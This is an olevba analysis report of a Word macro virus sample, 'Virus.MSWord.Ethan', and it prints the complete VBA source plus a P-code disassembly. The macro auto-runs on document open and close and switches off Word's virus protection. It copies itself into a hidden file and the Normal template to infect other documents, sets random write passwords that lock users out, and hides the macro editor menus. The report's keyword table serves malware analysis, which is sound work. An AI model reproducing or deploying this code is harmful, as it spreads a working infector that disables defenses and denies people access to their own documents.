olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.do
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.do - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
sss = "Private Sub Document_Close()"
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True: End With
 ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Randomize
If Dir("c:\windows\system\vmm32\NVMB.vxd", 6) = "" Then
Open "c:\windows\system\vmm32\NVMB.vxd" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\windows\system\vmm32\NVMB.vxd", 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sss Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
Else
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sss Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Else
    t = ""
End If
End If
If t <> "" Then
Open "c:\windows\system\vmm32\NVMB.vxd" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
End If
If Application.UserName = "ÍĎ ŃĎŃ" Or Application.UserName = "Ôčëčďďĺíęî" Then

Else
Set myDoc = ActiveDocument
If Month(Now()) >= 11 And Day(Now()) > 5 Then
   With Application.ActiveWindow.Document.Words.Item(25)
       .Text = Chr(13) + " With New Year   N V M B !!!  " + Chr(13)
       .Select
       .Font.Name = "Tahoma"
       .Font.Size = 16
       .Font.Animation = wdAnimationLasVegasLights
   End With
If Left(ActiveDocument.Name, 3) <> "DMB" Then
   i = Int((60 * Rnd) + 1)
   pass = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Count = Int((10 * Rnd) + 1)
   pass = Left(pass, Count)
   Open "c:\pass.sys" For Append As #1
   Print #1, ActiveDocument.Name
   Print #1, pass
   Close #1
   myDoc.WritePassword = pass
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
End If
End If
End If
 With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
End Sub
Private Sub Document_Open()
On Error Resume Next
 With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
Dim ee As CommandBarPopup
Set ee = Application.CommandBars("Menu Bar").Controls("&Ńĺđâčń")
ee.CommandBar.Controls("&Ěŕęđîń").Enabled = True
Dim S1 As CommandBarPopup
Set S1 = ee.CommandBar.Controls("&Ěŕęđîń")
For q = 1 To S1.Controls.Count
   If S1.CommandBar.Controls.Item(q).Caption = "&Đĺäŕęňîđ Visual Basic" Or S1.CommandBar.Controls.Item(q).Caption = "&Íŕ÷ŕňü çŕďčńü..." Or S1.CommandBar.Controls.Item(q).Caption = "&Ěŕęđîńű..." Then
      S1.CommandBar.Controls.Item(q).Visible = False
      S1.CommandBar.Controls.Item(q).Enabled = False
   End If
Next q
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.do
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5548 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	St sss 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0055 
' 	LitVarSpecial (True)
' 	MemStWith BackgroundSave 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #6:
' 	ArgsCall Read 0x0000 
' Line #7:
' 	LitStr 0x0020 "c:\windows\system\vmm32\NVMB.vxd"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0020 "c:\windows\system\vmm32\NVMB.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #10:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #14:
' 	LitStr 0x0020 "c:\windows\system\vmm32\NVMB.vxd"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sss 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sss 
' 	Ne 
' 	IfBlock 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitStr 0x0000 ""
' 	St t 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitStr 0x0020 "c:\windows\system\vmm32\NVMB.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #27:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #28:
' 	LitDI2 0x0001 
' 	St i 
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #31:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #33:
' 	Loop 
' Line #34:
' 	Label q 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0006 "ÍĎ ŃĎŃ"
' 	Eq 
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x000A "Ôčëčďďĺíęî"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #38:
' Line #39:
' 	ElseBlock 
' Line #40:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set myDoc 
' Line #41:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0019 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	MemLd Document 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #43:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x001E " With New Year   N V M B !!!  "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Then 
' Line #44:
' 	ArgsMemCallWith Set 0x0000 
' Line #45:
' 	LitStr 0x0006 "Tahoma"
' 	MemLdWith Font 
' 	MemSt New 
' Line #46:
' 	LitDI2 0x0010 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #47:
' 	Ld wdAnimationLasVegasLights 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #48:
' 	EndWith 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "DMB"
' 	Ne 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x003C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St i 
' Line #51:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St pass 
' Line #52:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Count 
' Line #53:
' 	Ld pass 
' 	Ld Count 
' 	ArgsLd LBound 0x0002 
' 	St pass 
' Line #54:
' 	LitStr 0x000B "c:\pass.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld pass 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #58:
' 	Ld pass 
' 	Ld myDoc 
' 	MemSt WritePassword 
' Line #59:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0058 
' 	LitVarSpecial (True)
' 	MemStWith BackgroundSave 
' 	BoS 0x0071 
' 	EndWith 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0056 
' 	LitVarSpecial (True)
' 	MemStWith BackgroundSave 
' 	BoS 0x006F 
' 	EndWith 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub Document_Open())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0056 
' 	LitVarSpecial (True)
' 	MemStWith BackgroundSave 
' 	BoS 0x006F 
' 	EndWith 
' Line #68:
' 	Dim 
' 	VarDefn ee (As CommandBarPopup)
' Line #69:
' 	SetStmt 
' 	LitStr 0x0007 "&Ńĺđâčń"
' 	LitStr 0x0008 "Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	Set ee 
' Line #70:
' 	LitVarSpecial (True)
' 	LitStr 0x0007 "&Ěŕęđîń"
' 	Ld ee 
' 	MemLd CommandBar 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #71:
' 	Dim 
' 	VarDefn S1 (As CommandBarPopup)
' Line #72:
' 	SetStmt 
' 	LitStr 0x0007 "&Ěŕęđîń"
' 	Ld ee 
' 	MemLd CommandBar 
' 	ArgsMemLd Controls 0x0001 
' 	Set S1 
' Line #73:
' 	StartForVariable 
' 	Ld q 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld S1 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #74:
' 	Ld q 
' 	Ld S1 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0016 "&Đĺäŕęňîđ Visual Basic"
' 	Eq 
' 	Ld q 
' 	Ld S1 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0011 "&Íŕ÷ŕňü çŕďčńü..."
' 	Eq 
' 	Or 
' 	Ld q 
' 	Ld S1 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Caption 
' 	LitStr 0x000B "&Ěŕęđîńű..."
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld q 
' 	Ld S1 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld q 
' 	Ld S1 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld q 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndSub 
' Line #80:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

